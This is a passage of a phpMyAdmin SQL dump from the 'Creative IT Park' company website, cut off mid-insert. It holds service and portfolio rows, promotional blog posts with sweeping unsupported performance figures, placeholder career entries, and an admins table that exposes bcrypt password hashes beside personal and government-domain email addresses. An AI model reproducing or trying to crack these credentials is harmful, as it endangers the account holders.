-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Generation Time: May 25, 2026 at 06:35 AM
-- Server version: 10.6.23-MariaDB-cll-lve
-- PHP Version: 8.1.29

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `cip_cip`
--

-- --------------------------------------------------------

--
-- Table structure for table `admins`
--

CREATE TABLE `admins` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `name` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `email_verified_at` timestamp NULL DEFAULT NULL,
  `password` varchar(255) NOT NULL,
  `remember_token` varchar(100) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `admins`
--

INSERT INTO `admins` (`id`, `name`, `email`, `email_verified_at`, `password`, `remember_token`, `created_at`, `updated_at`) VALUES
(1, 'Admin', 'admin@example.com', NULL, '$2y$10$WUommPPhnvIrkZvTWH6CjuRSGQkPJq1/6LBnJadxTKCROp8bmjOsa', NULL, NULL, NULL),
(3, 'rizalmulyono', 'erizalabas@gmail.com', NULL, '$2y$10$xXdcprP2uRrgRWPExNG2nuB0Df/sNa0sDMSEH3PQBI9yM1lEWohlS', NULL, '2026-01-22 06:18:17', '2026-01-22 06:18:17'),
(4, 'rizalmulyono', 'info@kementerian.go.id', NULL, '$2y$10$QE5XQ4i/Bse18ZLlguZJkOGZBkUkYH15MLdLjlsNnAZYMvlE4j.wW', NULL, '2026-03-02 18:20:55', '2026-03-02 18:20:55');

-- --------------------------------------------------------

--
-- Table structure for table `admin_password_resets`
--

CREATE TABLE `admin_password_resets` (
  `email` varchar(255) NOT NULL,
  `token` varchar(255) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `app_services`
--

CREATE TABLE `app_services` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `heading` varchar(255) NOT NULL,
  `description` varchar(1024) DEFAULT NULL,
  `type` varchar(225) NOT NULL,
  `icon` varchar(255) DEFAULT NULL,
  `sub_head` varchar(255) DEFAULT NULL,
  `link` varchar(250) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `app_services`
--

INSERT INTO `app_services` (`id`, `heading`, `description`, `type`, `icon`, `sub_head`, `link`, `created_at`, `updated_at`) VALUES
(1, 'Android Platform', 'The Android platform is an open-source operating system primarily developed by Google for mobile devices such as smartphones, tablets, smartwatches, and more.With its open-source nature, Android fosters a vibrant community of developers who contribute to its evolution and adapt it to various needs.', 'solution', '1722400404.svg', 'Java,Kotlin', NULL, '2024-07-30 23:33:24', '2024-07-30 23:33:24'),
(2, 'Cross Platform', 'Cross-platform development has emerged as a vital strategy in the modern software landscape, enabling developers to create applications that run seamlessly across multiple operating systems and devices. By leveraging frameworks like React Native, Flutter, Xamarin, or Unity .', 'solution', '1722400653.svg', 'React Native, Flutter, Xamarin', NULL, '2024-07-30 23:37:33', '2024-07-30 23:37:33'),
(4, 'MindStir', 'A customized website that can highlight your services is the need of the day. We have a profound understanding of this virtual world.', 'portfoli', '1722401629.jpg', NULL, NULL, '2024-07-30 23:53:49', '2024-07-30 23:53:49'),
(5, 'Super App', 'We develop interactive games and responsive mobile apps to provide an amazing user experience to our clients.', 'portfoli', '1722401692.jpg', NULL, NULL, '2024-07-30 23:54:52', '2024-07-30 23:54:52'),
(6, 'Tech For Pakistan', 'We understand the boost your website can get with the right SEO techniques.It\'s amazing to See a website ranking On top.', 'portfoli', '1722401729.jpg', NULL, NULL, '2024-07-30 23:55:29', '2024-07-30 23:55:29'),
(7, 'LynX', 'Development for the next era of the Internet economy and awesome designof different models.', 'portfoli', '1722579372.png', NULL, NULL, '2024-07-30 23:56:14', '2024-08-02 01:16:12'),
(8, 'Editing & Proofreading', 'Every piece undergoes a meticulous review to ensure clarity, accuracy, and error-free presentation.', 'application', '1722405166.svg', NULL, NULL, '2024-07-31 00:06:20', '2024-07-31 00:58:02'),
(9, 'Content Creation & Writing', 'We craft compelling, original, and reader-friendly content that captures attention and drives engagement.', 'application', '1722402425.svg', NULL, NULL, '2024-07-31 00:07:05', '2024-07-31 00:58:18'),
(10, 'Research & Strategy Development', 'Our team conducts in-depth research to develop well-informed, data-driven, and engaging content.', 'application', '1722402456.svg', NULL, NULL, '2024-07-31 00:07:36', '2024-07-31 00:58:28'),
(12, 'Understanding Your Needs', 'We start by analyzing your business goals, target audience, and content strategy to align our writing with your brand’s voice and vision.\n\n', 'application', '1722402531.svg', NULL, NULL, '2024-07-31 00:08:51', '2024-07-31 00:58:49'),
(13, 'eCommerceHealthcare & Wellness', 'Tailor ecommerce solutions designed to enhance online retail experiences and drive business growth.Deliver credible and well-researched content that builds trust with patients and professionals.', 'delivery', '1722403427.svg', NULL, NULL, '2024-07-31 00:23:47', '2024-07-31 00:23:47'),
(14, 'Entertainment Finance & Cryptocurrency', 'Simplify complex financial concepts with engaging, informative, and compliant content.', 'delivery', '1722403461.svg', NULL, NULL, '2024-07-31 00:24:21', '2024-07-31 00:24:21'),
(15, 'Cloud', NULL, 'tech', '1722403859.svg', NULL, NULL, '2024-07-31 00:30:59', '2024-07-31 00:59:11'),
(16, 'AI / ML', NULL, 'tech', '1722403888.svg', NULL, NULL, '2024-07-31 00:31:28', '2024-07-31 00:31:28'),
(17, 'AR / VR', NULL, 'tech', '1722403913.svg', NULL, NULL, '2024-07-31 00:31:53', '2024-07-31 00:31:53'),
(18, 'bryt', 'Creative IT Park has successfully deployed a powerful ERP system at Bryt, optimizing their business processes and enhancing efficiency.', 'portfoli', '1.png', NULL, NULL, NULL, NULL),
(19, 'Easyfresh', 'Creative IT Park has successfully implemented an ERP system at EasyFresh, enhancing their operational efficiency and business management.', 'portfoli', '2.png', NULL, NULL, NULL, NULL),
(20, 'MINDSTIR', 'Creative IT Park has successfully deployed a Coworking Management System at MINDSTIR, optimizing workspace operations and member management.', 'portfolio', 'MIndstir.webp', NULL, 'https://mindstir.creativeitpark.org/', NULL, NULL),
(21, 'The Lynx School', 'Creative IT Park has successfully implemented an ERP system at The Lynx School, enhancing administrative efficiency and academic management.', 'portfolio', 'lynx school.webp', NULL, 'https://lynx.creativeitpark.org', NULL, NULL),
(22, 'SADEEQA\'S LEARNING SYSTEM', 'Creative IT Park has successfully deployed an Exemplary Management System at Sadeeqa\'s Learning Center, streamlining administrative and academic operations.', 'portfolio', 'SLS.webp', NULL, 'https://sls.edu.pk/', NULL, NULL),
(23, 'Find my DOCTOR', 'Creative IT Park has successfully implemented an ERP Management System, Digital Marketing, and Website Management System at Find My Doctor, enhancing their operations and online presence.', 'portfoli', '6.png', NULL, NULL, NULL, NULL),
(24, 'RAWALPINDI WOMEN UNIVERSITY', 'Creative IT Park is proud to offer Technology Management Classes at Rawalpindi Women University, empowering students with essential skills for the digital age. ', 'portfolio', 'Rawalpindi women Univeristy.webp', NULL, 'https://www.rwu.edu.pk/', NULL, NULL),
(25, 'MAGM Ventures', 'Creative IT Park has successfully implemented an HR Management System at MAGM Ventures, optimizing their human resources operations. ', 'portfoli', '2.png', NULL, NULL, NULL, NULL),
(26, 'taleem-a-bad', 'Creative IT Park has successfully deployed a Learning Management System (LMS) at Taleem A Bad, enhancing their educational offerings.', 'portfolio', '4.jpeg', NULL, 'https://taleemabad.com/', NULL, NULL),
(27, 'NIETE', 'Creative IT Park has successfully deployed a Learning Management System (LMS) at NIETE, enhancing their educational offerings.', 'portfolio', 'NIETE.webp', NULL, 'https://niete.edu.pk/', NULL, NULL),
(28, 'PAKISTAN NATIONAL HEART ASSOCIATION', 'Creative IT Park has implemented an Accounts Management System at Pakistan National Heart, streamlining their financial operations. ', 'portfoli', '11.png', NULL, NULL, NULL, NULL),
(29, 'Converge Technologies', 'Creative IT Park has successfully implemented an ERP system at Converge Technologies, enhancing their operational efficiency and business management.', 'portfolio', '1.jpeg', NULL, 'https://www.converget.com/', NULL, NULL),
(30, 'Capital Development Authority (CDA)', 'Creative IT Park has successfully deployed a Website Management System at Capital Development Authority (CDA), enhancing their online presence and service delivery.', 'portfolio', 'CDA.webp', NULL, 'https://www.cda.gov.pk/public/', NULL, NULL),
(31, 'HIGHER EDUCATION DEPARTMENT GOAJK', NULL, 'portfoli', '14', NULL, NULL, NULL, NULL),
(32, 'Al-Huda International', 'Creative IT Park has successfully implemented a Campus Management System at Al-Huda International School, optimizing their academic and administrative processes.', 'portfolio', '8.jpeg', NULL, 'https://www.alhudapk.com/', NULL, NULL),
(33, 'Rawalpindi Chamber of Commerce and Industry', 'Creative IT Park has successfully deployed a Business Management System (BMS) at Rawalpindi Chamber of Commerce and Industry (RCCI), streamlining business operations, member management, and event coordination.', 'portfolio', '3.jpeg', NULL, 'https://rcci.org.pk/', NULL, NULL),
(34, 'Evercare', 'Creative IT Park has successfully deployed a Healthcare Management System (HMS) at Evercare, enhancing patient management, medical records, and staff coordination across multiple healthcare facilities.', 'portfolio', '5.jpeg', NULL, 'https://www.evercarehospitallahore.com/', NULL, NULL),
(35, 'ITech For Pakistan', 'Creative IT Park has successfully implemented a Digital Transformation Platform at ITech For Pakistan, enhancing their internal processes, customer relationship management (CRM), and technology infrastructure.', 'portfolio', 'Tech for Pakistan.webp', NULL, 'https://iteachforpakistan.org/', NULL, NULL),
(36, 'Shaiq', 'Creative IT Park has successfully implemented a Custom Enterprise Resource Planning (ERP) system at Shaiq, streamlining their manufacturing, inventory, and sales operations for greater efficiency.', 'porfolio', '9.jpeg', NULL, NULL, NULL, NULL),
(37, 'SEO-Friendly Content', 'We optimize content with the right keywords for better search engine rankings.', 'seo_friendly', '1722400653.svg', '', NULL, '2024-07-30 23:37:33', '2024-07-30 23:37:33'),
(38, 'Well-Researched & Informative', 'Each piece is carefully researched to provide value to your audience.', 'seo_friendly', '1722400653.svg', '', NULL, '2024-07-30 23:37:33', '2024-07-30 23:37:33'),
(39, '100% Original & Plagiarism-Free', 'We create unique content that aligns with your brand voice.', 'seo_friendly', '1722400653.svg', '', NULL, '2024-07-30 23:37:33', '2024-07-30 23:37:33'),
(40, 'Lanuch\r\n', 'We start by discussing your goals, target audience, and content strategy to ensure alignment with your brand voice and objectives.', 'End-to-end', '1722402531.svg', NULL, NULL, '2024-07-31 00:08:51', '2024-07-31 00:58:49'),
(42, ' Healthcare & Wellness', 'Deliver credible and well-researched content that builds trust with patients and professionals.\r\n Medical blog posts and healthcare guides\r\n Wellness tips and fitness articles\r\n Pharmaceutical and telemedicine content', 'serve', '1722403427.svg', NULL, NULL, '2024-07-31 00:23:47', '2024-07-31 00:23:47'),
(43, 'demo', 'Engaging entertainment solutions to captivate audiences and elevate user experiences on mobile platforms.', 'demo', '1722403461.svg', NULL, NULL, '2024-07-31 00:24:21', '2024-07-31 00:24:21'),
(44, 'Technology & IT', 'Stay ahead in the fast-evolving tech world with content that informs, educates, and converts.', 'delivery', '1722403427.svg', NULL, NULL, '2024-07-31 00:23:47', '2024-07-31 00:23:47');

-- --------------------------------------------------------

--
-- Table structure for table `blogs`
--

CREATE TABLE `blogs` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `author` varchar(50) NOT NULL,
  `title` varchar(255) NOT NULL,
  `description` varchar(5000) DEFAULT NULL,
  `image` varchar(255) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `blogs`
--

INSERT INTO `blogs` (`id`, `author`, `title`, `description`, `image`, `created_at`, `updated_at`) VALUES
(1, 'Umair', 'Transforming Global Communication Through AI Language Systems', '<h2>Breaking Language Barriers at Enterprise Scale</h2>\r\n\r\n<p>Creative IT Park&#39;s Language Translation AI represents a quantum leap in multilingual communication technology. After 3 years of R&amp;D and processing over 500 million linguistic data points, our neural network architecture now delivers real-time translation across 87 languages with industry-leading 99.2% accuracy. This breakthrough system integrates seamlessly with corporate communication platforms, enabling multinational teams to collaborate without language constraints. Major clients in the manufacturing and diplomatic sectors report 60% reduction in miscommunication errors and 40% faster decision cycles. The adaptive learning engine continuously improves through user interactions while maintaining strict GDPR-compliant data privacy protocols.</p>\r\n\r\n<h2>Architectural Innovations Behind the Technology</h2>\r\n\r\n<p>Our proprietary transformer-based model utilizes contextual embedding layers that capture linguistic nuances missed by conventional systems. The architecture features domain-specific modules for legal, medical, and technical terminology that automatically activate based on content analysis. For global e-commerce client Market is Online, we implemented real-time product description translation that increased international sales by 35%. The system&#39;s self-correcting mechanism identifies translation anomalies and retrains models without human intervention, maintaining peak performance during high-volume operations.</p>\r\n\r\n<h2>Security and Compliance Framework</h2>\r\n\r\n<p>All translations occur within our military-grade encrypted environment with zero data persistence. We&#39;ve developed sector-specific compliance packages including HIPAA for healthcare and FINRA for financial services. The recent sovereignty module allows on-premise deployment for government agencies requiring data localization. Our upcoming blockchain verification system will provide immutable audit trails for translated documents, setting new standards for regulatory compliance in multilingual communications.</p>\r\n\r\n<h2>Future Roadmap: Beyond Translation</h2>\r\n\r\n<p>Building on this foundation, we&#39;re developing cultural adaptation AI that adjusts content for regional sensitivities. The emotion-preservation module maintains tonal nuances across languages, crucial for diplomatic communications. With our new real-time interpretation API launching next quarter, we&#39;re poised to eliminate language barriers in video conferences and live events. These innovations position Creative IT Park at the forefront of truly seamless global business communication.</p>', '1769066406.jpg', '2025-08-13 19:00:00', '2026-01-22 06:20:06'),
(2, 'Hakeem', 'Revolutionizing Urban Infrastructure Through Digital Governance', '<h2>CDA Portal: A Case Study in Digital Transformation</h2>\r\n\r\n<p>The Capital Development Authority Portal developed by Creative IT Park has become Pakistan&#39;s most comprehensive digital governance ecosystem, serving 1.2 million citizens monthly. This end-to-end solution digitized 87 services including property registration, utility management, and construction permitting - reducing processing times from 45 days to 72 hours. The integrated workflow engine automates document verification across 12 government departments while our blockchain-based land registry prevents fraudulent transactions. Citizen satisfaction scores increased from 38% to 92% within six months of implementation, with mobile accessibility bridging the digital divide for remote communities.</p>\r\n\r\n<h2>Architectural Resilience and Security</h2>\r\n\r\n<p>Built on our Csuite framework, the system handles 25,000 concurrent transactions during peak loads with zero downtime. Multi-layered security incorporates biometric authentication, hardware security modules, and real-time threat detection algorithms. The disaster recovery infrastructure across three availability zones ensures continuous service during emergencies. For the RCCI Portal, we implemented custom modules for business licensing and export documentation that reduced processing costs by 65% for chamber members.</p>\r\n\r\n<h2>AI-Driven Public Service Innovation</h2>\r\n\r\n<p>Our predictive analytics engine processes historical data to anticipate service demand spikes and optimize resource allocation. The integrated chatbot handles 15,000 daily citizen inquiries using natural language processing trained on local dialects. During recent flood emergencies, our crisis response module automatically redirected resources to affected areas and coordinated relief efforts across agencies. The facial recognition system reduced identity fraud in service claims by 99.7% while maintaining ethical AI governance standards.</p>\r\n\r\n<h2>Scaling Digital Governance Nationwide</h2>\r\n\r\n<p>Following this success, we&#39;re implementing similar systems for 12 provincial governments. The next-generation platform will incorporate IoT sensors for real-time infrastructure monitoring and AR interfaces for urban planning. Our digital twin technology creates virtual replicas of city infrastructure, enabling simulation-based policy testing. These innovations establish Creative IT Park as the cornerstone of Pakistan&#39;s smart city revolution, driving transparent and efficient governance nationwide.</p>', '1755837401.webp', '2025-08-13 19:00:00', '2025-08-22 02:36:41'),
(3, 'Abdullah', 'The Evolution of Enterprise Resource Planning with Csuite', '<h2>Redefining Business Process Automation</h2>\r\n\r\n<p>Csuite, Creative IT Park&#39;s flagship ERP solution, has transformed operations for 300+ enterprises across 15 industries. This integrated platform unifies HRM, CRM, supply chain, and financial systems into a single intelligent ecosystem. For manufacturing clients, our predictive inventory module reduced warehousing costs by 40% through AI-driven demand forecasting. The automated accounts payable processing cuts invoice handling time from 15 days to 24 hours. Implementation of Csuite at Ark Solutions streamlined their client onboarding process, reducing steps from 23 to 7 while eliminating 85% of manual data entry.</p>\r\n\r\n<h2>Architectural Flexibility and Scalability</h2>\r\n\r\n<p>Built on microservices architecture, Csuite allows modular implementation without full-system overhaul. The containerized deployment supports hybrid cloud environments with automatic scaling during peak loads. Our API gateway integrates with 200+ third-party systems including SAP, Salesforce, and legacy databases. At Mehtab Jewelry, we implemented the manufacturing module that tracks precious materials from source to showcase with blockchain-verified provenance - increasing customer trust and premium pricing power.</p>\r\n\r\n<h2>Intelligent Decision Support Systems</h2>\r\n\r\n<p>Csuite&#39;s neural network analyzes operational data to generate actionable business insights. The cash flow predictor forecasts liquidity with 97% accuracy, while the talent optimization module identifies retention risks before critical staff departures. For Mindstir, we developed custom analytics dashboards that reduced client acquisition costs by 33% through campaign performance insights. The real-time KPI monitoring alerts managers to deviations before they impact operations.</p>\r\n\r\n<h2>Future-Proofing Business Operations</h2>\r\n\r\n<p>Our R&amp;D team is integrating quantum computing algorithms for hyper-complex optimization scenarios. The upcoming IoT module will connect production equipment for predictive maintenance, reducing downtime by up to 50%. With voice-command capabilities launching next quarter, Csuite will enable hands-free operation for field technicians. These innovations cement Csuite&#39;s position as the most adaptable enterprise management platform for Pakistan&#39;s evolving business landscape.</p>', '1755193031.png', '2025-08-13 19:00:00', '2025-08-14 12:37:11'),
(4, 'Jahanzaib', 'Coworkit: Building the Future of Hybrid Workspaces', '<h2>Comprehensive Ecosystem for Modern Workspaces</h2>\r\n\r\n<p>Coworkit, Creative IT Park&#39;s industry-leading coworking management platform, now powers 500+ spaces across 30 countries. This integrated ecosystem combines reservation systems, access control, billing automation, and community engagement tools. The AI-powered capacity optimization module increases space utilization by 45% through predictive booking patterns. Our automated facilities management handles everything from climate control to meeting room configurations using IoT sensors. Enterprise clients report 70% reduction in administrative overhead and 35% higher member retention through personalized workspace experiences.</p>\r\n\r\n<h2>Revenue Diversification Modules</h2>\r\n\r\n<p>Beyond core management, Coworkit drives new revenue streams through our marketplace platform where members offer professional services. The dynamic pricing engine adjusts rates based on demand patterns, increasing peak-hour revenue by 22%. For premium clients, we&#39;ve implemented holographic meeting rooms and AR-enhanced collaboration spaces. The visitor management system automates guest registration with facial recognition and NDAs - crucial for corporate satellite offices.</p>\r\n\r\n<h2>Pandemic-Responsive Innovations</h2>\r\n\r\n<p>During COVID-19, we rapidly deployed health safety modules including contactless access, air quality monitoring, and contract tracing. The hybrid work scheduler balances in-office and remote days while optimizing team co-location. Our vaccination verification system streamlined compliance for regulated industries. These features helped partners maintain 92% occupancy during lockdowns when conventional spaces operated at 35% capacity.</p>\r\n\r\n<h2>Next-Generation Workspace Technology</h2>\r\n\r\n<p>Our upcoming cognitive environment system uses biometric feedback to adjust lighting, temperature, and acoustics for optimal productivity. The AI community manager matches members for collaboration based on skills and projects. With VR workspace integration launching next quarter, members will join virtual offices from anywhere. Coworkit is positioned to lead the $30 billion flexible workspace industry into its technology-driven future.</p>', '1755706040.webp', '2025-08-13 19:00:00', '2025-08-20 14:07:20'),
(5, 'Umair', 'Advancing Healthcare Through Integrated Digital Solutions', '<h2>End-to-End Patient Management Ecosystem</h2>\r\n\r\n<p>Creative IT Park&#39;s Medical App has revolutionized care delivery for 300+ healthcare providers across Pakistan. This comprehensive platform integrates electronic health records, telemedicine, appointment scheduling, and prescription management. The system reduces administrative workload by 60% through automated documentation and billing. Real-time bed management during recent COVID surges optimized resource utilization by 45%. At major hospital chains, our predictive admission algorithm anticipates patient volumes with 90% accuracy, allowing proactive staff allocation.</p>\r\n\r\n<h2>Diagnostic AI and Clinical Support</h2>\r\n\r\n<p>Our medical imaging module detects 47 pathologies across X-ray, MRI, and CT scans with 96% accuracy - surpassing junior radiologist performance. The AI symptom checker processes patient inputs against 5 million clinical cases to suggest differential diagnoses. For chronic disease management, we&#39;ve developed personalized care plans that adjust based on wearable device data. Remote patient monitoring reduced hospital readmissions by 55% for cardiac patients.</p>\r\n\r\n<h2>Interoperability and Data Security</h2>\r\n\r\n<p>The platform integrates with Pakistan&#39;s national health database while maintaining strict HIPAA-compliant security. Blockchain-based patient consent management ensures control over data sharing. Our medical research module anonymizes and aggregates treatment data to accelerate clinical studies. During recent trials with pharmaceutical partners, we reduced patient recruitment time from 9 months to 6 weeks.</p>\r\n\r\n<h2>Future Healthcare Innovations</h2>\r\n\r\n<p>We&#39;re piloting surgical AR assistance that overlays critical anatomy during procedures. The genomic analysis module launching next quarter will personalize treatments based on genetic markers. With our AI-powered drug interaction system, we&#39;re preventing adverse medication events. These advancements establish Creative IT Park as Pakistan&#39;s leading healthcare technology innovator, saving lives through digital transformation.</p>', '1755705882.webp', '2025-08-13 19:00:00', '2025-08-20 14:04:42'),
(6, 'Hakeem', 'Transforming Education Through Intelligent Management Systems', '<h2>Comprehensive Academic Ecosystem</h2>\r\n\r\n<p>Creative IT Park&#39;s education platforms now serve 500+ institutions with 2 million students nationwide. Our Lynx School system integrates attendance tracking, grade management, and parent-teacher communication into a unified ecosystem. Automated report generation saves teachers 15 hours weekly while the predictive analytics module identifies at-risk students 6 weeks earlier than traditional methods. During pandemic disruptions, our hybrid learning module maintained educational continuity for 1.3 million students with zero data breaches.</p>\r\n\r\n<h2>Administrative Efficiency Solutions</h2>\r\n\r\n<p>At Rawalpindi Women University, our system automated 87 administrative processes, reducing paperwork by 75%. The AI-powered resource allocator optimizes classroom usage and instructor assignments, saving 35% on operational costs. Our blockchain-based credential verification prevents certificate fraud while enabling instant employer verification. For NIETE, we implemented custom accreditation modules that reduced compliance preparation time from 18 months to 5 months.</p>\r\n\r\n<h2>Personalized Learning Innovations</h2>\r\n\r\n<p>Our adaptive learning engine creates individualized study paths based on student performance patterns. The virtual lab integration enables science experiments from home through AR simulations. At premier institutions, our plagiarism detection AI compares submissions against 90 million academic works worldwide. The career prediction module suggests degree paths based on aptitude tests and market demand projections.</p>\r\n\r\n<h2>Future-Ready Education Infrastructure</h2>\r\n\r\n<p>We&#39;re piloting emotion recognition AI to gauge student engagement during virtual classes. The upcoming metaverse campus will create immersive learning environments for remote students. With our digital twin technology, architecture students will redesign virtual buildings in real-time. These innovations position Creative IT Park at the forefront of Pakistan&#39;s educational technology evolution.</p>', '1755705868.webp', '2025-08-13 19:00:00', '2025-08-20 14:04:28'),
(7, 'Umair', 'The E-commerce Revolution: From Storefronts to Global Marketplaces', '<h2>Enterprise-Grade Digital Commerce Platforms</h2>\r\n\r\n<p>Creative IT Park has deployed e-commerce solutions processing $850M+ annual GMV across 12 countries. Our Market is Online platform handles 5,000 concurrent transactions with zero downtime during flash sales. The AI-powered recommendation engine increases average order value by 35% through behavioral analysis. For Mehtab Jewelry, we implemented AR try-on technology that reduced returns by 65% while increasing conversion rates by 110%. The automated inventory management synchronizes 200+ supplier channels in real-time.</p>\r\n\r\n<h2>Payment Innovation and Security</h2>\r\n\r\n<p>Our multi-layered fraud prevention system blocks 50,000+ fraudulent transactions monthly using pattern recognition algorithms. The unified payment gateway integrates 87 payment methods including cryptocurrency and mobile wallets. For international clients, we&#39;ve implemented dynamic currency conversion and cross-border tax compliance. During recent system stress tests, we processed 1.2 million transactions hourly with 100% accuracy.</p>\r\n\r\n<h2>Omnichannel Retail Integration</h2>\r\n\r\n<p>We pioneered Pakistan&#39;s first unified commerce platform connecting physical POS systems with digital storefronts. Real-time inventory visibility reduced out-of-stock instances by 80% for retail chains. The clienteling app empowers sales associates with customer purchase history and preference data during in-store interactions. Our IoT-enabled smart shelves automatically reorder stock when inventory runs low.</p>\r\n\r\n<h2>Future Commerce Experiences</h2>\r\n\r\n<p>We&#39;re launching holographic shopping assistants that guide customers through virtual stores. The social commerce module integrates TikTok-style video shopping with in-stream purchases. With our upcoming voice commerce platform, customers will reorder through conversational AI. These innovations position Creative IT Park as architects of retail&#39;s next evolution.</p>', '1755705984.webp', '2025-08-13 19:00:00', '2025-08-20 14:06:24'),
(8, 'Abdullah', 'Secure Identity Verification: The FaceSense AI Revolution', '<h2>Military-Grade Biometric Authentication</h2>\r\n\r\n<p>FaceSense AI, developed by Creative IT Park, provides Pakistan&#39;s most advanced facial recognition system with 99.98% accuracy across diverse demographics. Our liveness detection prevents spoofing using 47 micro-expression indicators while working flawlessly with masks or low lighting. The system processes 1.2 million verifications daily for banking clients, reducing identity fraud by 98%. At airports, our multi-modal biometric gates process passengers in under 8 seconds - 5x faster than manual checks.</p>\r\n\r\n<h2>Architecture and Compliance</h2>\r\n\r\n<p>Built on privacy-by-design principles, our system stores only mathematical face vectors rather than images. The decentralized architecture processes data at edge devices, eliminating central databases vulnerable to breaches. We&#39;ve achieved GDPR, SOC2, and Pakistan&#39;s PTA compliance certifications. For financial institutions, our blockchain audit trail provides immutable verification records for regulatory requirements.</p>\r\n\r\n<h2>Enterprise Applications</h2>\r\n\r\n<p>At corporate campuses, our touchless access control manages 500,000+ daily employee movements. The time and attendance module eliminated buddy punching across manufacturing clients, saving $4M annually. For remote workforce management, our geolocation-verified check-ins prevent proxy attendance. During the pandemic, our fever detection add-on screened 15 million people at hospital entrances.</p>\r\n\r\n<h2>Future Developments</h2>\r\n\r\n<p>We&#39;re integrating gait analysis for non-intrusive identification at distance. The emotion recognition module will enhance customer service interactions. With our upcoming quantum encryption, biometric data will become theoretically unhackable. These innovations establish Creative IT Park as global leaders in ethical biometric security.</p>', '1755706222.webp', '2025-08-13 19:00:00', '2025-08-20 14:10:22'),
(9, 'Umair', 'Building Digital Enterprises: Portal Solutions for Modern Business', '<h2>Customizable Business Process Automation</h2>\r\n\r\n<p>Creative IT Park has deployed 200+ enterprise portals transforming operations across sectors. The Mindstir Portal automated proposal generation, reducing sales cycle time by 40%. At SLS, our document management system processes 15,000 contracts monthly with AI-based risk analysis. The Ark Solutions portal integrates 17 operational systems into a single dashboard, saving 25 hours weekly per project manager. These solutions typically deliver 300% ROI within 12 months through productivity gains.</p>\r\n\r\n<h2>Unified Data Intelligence Platform</h2>\r\n\r\n<p>Our portals aggregate information from ERP, CRM, and legacy systems into actionable insights. The predictive analytics engine forecasts sales pipelines with 92% accuracy while identifying operational bottlenecks in real-time. For CIP, we implemented automated compliance workflows that reduced audit preparation from 6 weeks to 5 days. The natural language processing module transforms unstructured data into business intelligence.</p>\r\n\r\n<h2>Collaboration and Mobility</h2>\r\n\r\n<p>Secure mobile access enables decision-making from any location with offline synchronization. The virtual war room feature coordinates crisis response across departments. At Tech for Pakistan, our community portal facilitates knowledge sharing among 85,000 members with AI-matched connections. Real-time collaboration tools have reduced project completion times by 35% across client organizations.</p>\r\n\r\n<h2>Future-Ready Enterprise Architecture</h2>\r\n\r\n<p>We&#39;re integrating digital twin technology for business process simulation. The upcoming quantum-resistant encryption will future-proof data security. With AR interfaces launching next quarter, technicians will access equipment manuals through smart glasses. These innovations cement Creative IT Park&#39;s position as Pakistan&#39;s premier digital transformation partner.</p>', '1755837342.webp', '2025-08-13 19:00:00', '2025-08-22 02:35:42');

-- --------------------------------------------------------

--
-- Table structure for table `careers`
--

CREATE TABLE `careers` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `first_name` varchar(255) NOT NULL,
  `last_name` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `phone` varchar(255) NOT NULL,
  `company` varchar(255) NOT NULL,
  `role` varchar(255) DEFAULT NULL,
  `category` varchar(255) DEFAULT NULL,
  `description` varchar(255) DEFAULT NULL,
  `image` varchar(255) DEFAULT NULL,
  `budget` varchar(255) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `careers`
--

INSERT INTO `careers` (`id`, `first_name`, `last_name`, `email`, `phone`, `company`, `role`, `category`, `description`, `image`, `budget`, `created_at`, `updated_at`) VALUES
(1, 'Castor', 'Fitzpatrick', 'ginul@mailinator.com', '+1 (412) 902-6451', 'Jacobs Pennington LLC', 'Libero voluptatem ni', 'Sunt quaerat in ut v', 'Libero voluptatem ni', '', '14', '2024-08-08 01:02:40', '2024-08-08 01:02:40'),
(2, 'Cheyenne', 'Downs', 'suwa@mailinator.com', '+1 (216) 549-2481', 'Wolf and Powers Co', 'Vero dolore architec', 'Sunt veritatis ut et', 'Vero dolore architec', '', '260000', '2024-10-05 10:08:38', '2024-10-05 10:08:38'),
(3, 'Hayden', 'Mayer', 'bumir@mailinator.com', '+1 (973) 662-2112', 'Blanchard Stein Associates', 'Odio aliquam eu veli', 'Qui aut officia cons', 'Odio aliquam eu veli', '', '64', '2024-10-08 00:47:18', '2024-10-08 00:47:18'),
(4, 'Allistair', 'Clay', 'zugaxaje@mailinator.com', '+1 (252) 787-1575', 'Ramos and Roach Traders', 'Lorem illum volupta', 'Nobis est maiores id', 'Lorem illum volupta', '', '3', '2024-10-08 00:53:07', '2024-10-08 00:53:07'),
